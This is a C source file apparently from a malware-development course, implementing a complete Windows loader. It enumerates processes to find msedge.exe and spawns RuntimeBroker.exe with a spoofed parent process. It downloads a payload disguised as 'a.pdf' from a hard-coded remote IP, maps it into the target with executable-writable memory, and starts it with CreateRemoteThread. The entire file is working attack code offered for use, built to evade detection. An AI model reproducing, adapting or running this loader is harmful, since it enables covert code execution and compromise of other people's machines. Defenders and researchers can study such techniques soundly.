// @NUL0x4C | @mrd0x : MalDevAcademy

#include <Windows.h>
#include <stdio.h>
#include <Tlhelp32.h>
#include <WinInet.h>
#include <psapi.h>


#pragma comment (lib, "OneCore.lib")	// needed to compile `MapViewOfFile2`
#pragma comment (lib, "Wininet.lib")
// disable error 4996 (caused by sprint)
#pragma warning (disable:4996)

#define PARENT_PROCESS		L"msedge.exe"
#define TARGET_PROCESS		"RuntimeBroker.exe -Embedding"
#define PAYLOAD_CONTROL_STRING	"gerby"
#define PAYLOAD	L"http://192.168.124.171/a.pdf"

// Get a file's payload from a url (http or https)
// Return a base address of a heap allocated buffer, thats the payload
// Return the payload's size
BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {

	BOOL		bSTATE = TRUE;

	HINTERNET	hInternet = NULL,
		hInternetFile = NULL;

	DWORD		dwBytesRead = NULL;

	SIZE_T		sSize = NULL; 	 			// Used as the total payload size

	PBYTE		pBytes = NULL,					// Used as the total payload heap buffer
		pTmpBytes = NULL;					// Used as the tmp buffer (of size 1024)

	// Opening the internet session handle, all arguments are NULL here since no proxy options are required
	hInternet = InternetOpenW(L"gerby", NULL, NULL, NULL, NULL);
	if (hInternet == NULL) {
		printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	// Opening the handle to the payload using the payload's URL
	hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
	if (hInternetFile == NULL) {
		printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	// Allocating 1024 bytes to the temp buffer
	pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
	if (pTmpBytes == NULL) {
		bSTATE = FALSE; goto _EndOfFunction;
	}

	while (TRUE) {

		// Reading 1024 bytes to the tmp buffer. The function will read less bytes in case the file is less than 1024 bytes.
		if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
			printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
			bSTATE = FALSE; goto _EndOfFunction;
		}

		// Calculating the total size of the total buffer 
		sSize += dwBytesRead;

		// In case the total buffer is not allocated yet
		// then allocate it equal to the size of the bytes read since it may be less than 1024 bytes
		if (pBytes == NULL)
			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
		else
			// Otherwise, reallocate the pBytes to equal to the total size, sSize.
			// This is required in order to fit the whole payload
			pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

		if (pBytes == NULL) {
			bSTATE = FALSE; goto _EndOfFunction;
		}

		// Append the temp buffer to the end of the total buffer
		memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);

		// Clean up the temp buffer
		memset(pTmpBytes, '\0', dwBytesRead);

		// If less than 1024 bytes were read it means the end of the file was reached
		// Therefore exit the loop 
		if (dwBytesRead < 1024) {
			break;
		}

		// Otherwise, read the next 1024 bytes
	}


	// Saving 
	*pPayloadBytes = pBytes;
	*sPayloadSize = sSize;

_EndOfFunction:
	if (hInternet)
		InternetCloseHandle(hInternet);											// Closing handle 
	if (hInternetFile)
		InternetCloseHandle(hInternetFile);										// Closing handle
	if (hInternet)
		InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);	// Closing Wininet connection
	if (pTmpBytes)
		LocalFree(pTmpBytes);													// Freeing the temp buffer
	return bSTATE;
}


BOOL CreatePPidSpoofedProcess(IN HANDLE hParentProcess, IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {

	CHAR					lpPath[MAX_PATH * 2];
	CHAR					CurrentDir[MAX_PATH];
	CHAR					WnDr[MAX_PATH];

	SIZE_T							sThreadAttList = NULL;
	PPROC_THREAD_ATTRIBUTE_LIST		pThreadAttList = NULL;

	STARTUPINFOEXA			SiEx = { 0 };
	PROCESS_INFORMATION		Pi = { 0 };

	// cleaning the structs (setting elements values to 0)
	RtlSecureZeroMemory(&SiEx, sizeof(STARTUPINFOEXA));
	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

	// setting the size of the structure
	SiEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);

	// getting the %windir% system variable path (this is 'C:\Windows')
	if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
		printf("[!] GetEnvironmentVariableA Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// making the target process path
	sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);

	// making the `lpCurrentDirectory` parameter in CreateProcessA
	sprintf(CurrentDir, "%s\\System32\\", WnDr);


	//-------------------------------------------------------------------------------

		// this will fail with ERROR_INSUFFICIENT_BUFFER / 122
	InitializeProcThreadAttributeList(NULL, 1, NULL, &sThreadAttList);

	// allocating enough memory
	pThreadAttList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sThreadAttList);
	if (pThreadAttList == NULL) {
		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// calling InitializeProcThreadAttributeList again passing the right parameters
	if (!InitializeProcThreadAttributeList(pThreadAttList, 1, NULL, &sThreadAttList)) {
		printf("[!] InitializeProcThreadAttributeList Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	if (!UpdateProcThreadAttribute(pThreadAttList, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL)) {
		printf("[!] UpdateProcThreadAttribute Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// setting the `LPPROC_THREAD_ATTRIBUTE_LIST` element in `SiEx` to be equal to what was
	// created using `UpdateProcThreadAttribute` - that is the parent process
	SiEx.lpAttributeList = pThreadAttList;

	//-------------------------------------------------------------------------------
	if (!CreateProcessA(
		NULL,
		lpPath,
		NULL,
		NULL,
		FALSE,
		EXTENDED_STARTUPINFO_PRESENT,
		NULL,
		CurrentDir,
		&SiEx.StartupInfo,
		&Pi)) {
		printf("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
		return FALSE;
	}


	// filling up the OUTPUT parameter with 'CreateProcessA's output'
	*dwProcessId = Pi.dwProcessId;
	*hProcess = Pi.hProcess;
	*hThread = Pi.hThread;


	// cleaning up
	DeleteProcThreadAttributeList(pThreadAttList);
	CloseHandle(hParentProcess);

	// doing a small check to verify we got everything we need
	if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
		return TRUE;

	return FALSE;
}


// allocate a local `Mapped` writable buffer and copy the payload to it
// then it maps that local buffer to an executable remote buffer, so that the remotly allcoated buffer
// includes the payload  
// it return the base address of the payload 
BOOL RemoteMapInject(IN HANDLE hProcess, IN PBYTE pPayload, IN SIZE_T sPayloadSize, OUT PVOID* ppAddress) {

	BOOL		bSTATE				= TRUE;
	HANDLE		hFile				= NULL;
	PVOID		pMapLocalAddress	= NULL,
				pMapRemoteAddress	= NULL;


	// create a file mapping handle with `RWX` memory permissions
	// this doesnt have to allocated `RWX` view of file unless it is specified in the MapViewOfFile/2 call  
	hFile = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sPayloadSize, NULL);
	if (hFile == NULL) {
		printf("\t[!] CreateFileMapping Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	// maps the view of the payload to the memory 
	// FILE_MAP_WRITE are the permissions of the file (payload) - 
	// since we only neet to write (copy) the payload to it
	pMapLocalAddress = MapViewOfFile(hFile, FILE_MAP_WRITE, NULL, NULL, sPayloadSize);
	if (pMapLocalAddress == NULL) {
		printf("\t[!] MapViewOfFile Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}
	
	memcpy(pMapLocalAddress, pPayload, sPayloadSize);

	// maps the payload to a new remote buffer (in the target process)
	// it is possible here to change the memory permissions to `RWX`
	pMapRemoteAddress = MapViewOfFile2(hFile, hProcess, NULL, NULL, NULL, NULL, PAGE_EXECUTE_READWRITE);
	if (pMapRemoteAddress == NULL) {
		printf("\t[!] MapViewOfFile2 Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

_EndOfFunction:
	*ppAddress = pMapRemoteAddress;
	if (hFile)
		CloseHandle(hFile);
	return bSTATE;
}




BOOL GetRemoteProcessHandle(IN LPWSTR szProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess) {

	HANDLE			hSnapShot = NULL;
	PROCESSENTRY32	Proc = {
					.dwSize = sizeof(PROCESSENTRY32)
	};

	// Takes a snapshot of the currently running processes 
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (hSnapShot == INVALID_HANDLE_VALUE) {
		printf("\t[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	// Retrieves information about the first process encountered in the snapshot.
	if (!Process32First(hSnapShot, &Proc)) {
		printf("\n\t[!] Process32First Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	do {

		WCHAR LowerName[MAX_PATH * 2];

		if (Proc.szExeFile) {

			DWORD	dwSize = lstrlenW(Proc.szExeFile);
			DWORD   i = 0;

			RtlSecureZeroMemory(LowerName, MAX_PATH * 2);

			// converting each charachter in Proc.szExeFile to a lower case character and saving it
			// in LowerName to do the *wcscmp* call later ...

			if (dwSize < MAX_PATH * 2) {

				for (; i < dwSize; i++)
					LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);

				LowerName[i++] = '\0';
			}
		}

		// compare the enumerated process path with what is passed, if equal ..
		if (wcscmp(LowerName, szProcessName) == 0) {
			// we save the process id 
			*dwProcessId = Proc.th32ProcessID;
			// we open a process handle and return
			*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
			if (*hProcess == NULL)
				printf("\n\t[!] OpenProcess Failed With Error : %d \n", GetLastError());

			break;
		}

		// Retrieves information about the next process recorded the snapshot.
	} while (Process32Next(hSnapShot, &Proc));
	// while we can still have a valid output ftom Process32Net, continue looping


_EndOfFunction:
	if (hSnapShot != NULL)
		CloseHandle(hSnapShot);
	if (*dwProcessId == NULL || *hProcess == NULL)
		return FALSE;
	return TRUE;
}


int wmain() {

	// RemoteMap Injection
	HANDLE		hThread			= NULL;
	PVOID		pAddress		= NULL;
	DWORD		dwProcessId		= NULL;
	
	// Payload staging
	SIZE_T		Size = NULL;
	PBYTE		Payload = NULL;

	// TARGET PROCESS CREATION
	DWORD		Pid = NULL;
	HANDLE		hProcess = NULL;

	// PPID Spoofing
	DWORD		dwPPid = NULL;
	HANDLE		hPProcess = NULL;

	if (!GetRemoteProcessHandle(PARENT_PROCESS, &dwPPid, &hPProcess)) {
		printf("[!] parent process handle Failed with Error : %d \n", GetLastError());
		return -1;
	}

	// openning a handle to the parent process
	if ((hPProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPPid)) == NULL) {
		printf("[!] OpenProcess Failed with Error : %d \n", GetLastError());
		return -1;
	}

	printf("[i] Spawning Target Process \"%s\" With Parent : %d \n", TARGET_PROCESS, dwPPid);
	if (!CreatePPidSpoofedProcess(hPProcess, TARGET_PROCESS, &dwProcessId, &hProcess, &hThread)) {
		return -1;
	}

	// Reading the payload 
	if (!GetPayloadFromUrl(PAYLOAD, &Payload, &Size)) {
		return -1;
	}

	printf("[i] Injecting Target Process ... \n");
	if (!RemoteMapInject(hProcess, Payload, Size, &pAddress)) {
		printf("[!] FAILED \n");
		return -1;
	}
	printf("[+] DONE \n");

	hThread = CreateRemoteThread(hProcess, NULL, NULL, pAddress, NULL, NULL, NULL);
	if (hThread == NULL)
		printf("[!] CreateRemoteThread Failed With Error : %d \n", GetLastError());

	return 0;
}


